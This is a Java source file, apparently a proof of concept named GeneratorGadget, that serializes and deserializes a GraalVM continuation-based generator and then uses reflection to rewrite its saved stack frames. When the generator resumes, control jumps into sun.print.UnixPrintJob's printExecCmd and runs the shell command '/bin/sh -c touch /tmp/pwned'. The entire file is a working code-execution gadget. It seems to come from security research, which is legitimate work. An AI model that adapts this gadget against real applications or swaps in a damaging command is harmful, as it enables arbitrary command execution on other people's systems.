package exploit.gadget;

import exploit.Counter;
import util.ReflectUtil;
import util.SerializeUtil;
import org.graalvm.continuations.Continuation;
import org.graalvm.continuations.Generator;

import java.lang.reflect.Method;

public class GeneratorGadget {
    public static void main(String[] args) throws Exception {
        Counter counter = new Counter();
        counter.nextElement();

        byte[] serialized = SerializeUtil.serialize(counter);
        System.out.println("serialized");

        Counter deserialized = (Counter) SerializeUtil.deserialize(serialized);
        System.out.println("deserialized");

        Continuation continuation = (Continuation) ReflectUtil.getFieldValue(Generator.class, deserialized, "continuation");

        // org.graalvm.continuations.ContinuationImpl.run
        Object stackFrameHead = ReflectUtil.getFieldValue(continuation, "stackFrameHead");
        Object next = stackFrameHead;

        Method method;
        Object[] pointers;
        long[] primitives;
        int bci;

        // org.graalvm.continuations.Generator$$Lambda/1382.start
        next = ReflectUtil.getFieldValue(next, "next");
        // org.graalvm.continuations.Generator.lambda$new$4fbf9434$1
        next = ReflectUtil.getFieldValue(next, "next");
        // exploit.Counter.generate
        next = ReflectUtil.getFieldValue(next, "next");
        // org.graalvm.continuations.Generator.emit
        next = ReflectUtil.getFieldValue(next, "next");
        // org.graalvm.continuations.SuspendCapability.suspend
        next = ReflectUtil.getFieldValue(next, "next");

        method = Class.forName("sun.print.UnixPrintJob$PrinterSpooler").getDeclaredMethod("run");
        pointers = new Object[]{ null, null, "a", "b" };
        primitives = new long[]{ 0, 0, 0, 0 };
        bci = 98;

        ReflectUtil.setFieldValue(next, "method", method);
        ReflectUtil.setFieldValue(next, "pointers", pointers);
        ReflectUtil.setFieldValue(next, "primitives", primitives);
        ReflectUtil.setFieldValue(next, "bci", bci);

        // org.graalvm.continuations.ContinuationImpl.trySuspend
        next = ReflectUtil.getFieldValue(next, "next");

        method = Class.forName("sun.print.UnixPrintJob").getDeclaredMethod("printExecCmd", String.class, String.class, boolean.class, String.class, int.class, String.class);
        pointers = new Object[]{ null, null, "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", new String[] { "/bin/sh", "-c", "touch /tmp/pwned" } };
        primitives = new long[]{  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
        bci = 367;

        ReflectUtil.setFieldValue(next, "method", method);
        ReflectUtil.setFieldValue(next, "pointers", pointers);
        ReflectUtil.setFieldValue(next, "primitives", primitives);
        ReflectUtil.setFieldValue(next, "bci", bci);

        System.out.println(continuation.toDebugString());

        ReflectUtil.setFieldValue(Generator.class, deserialized, "continuation", continuation);
        deserialized.nextElement();
    }
}
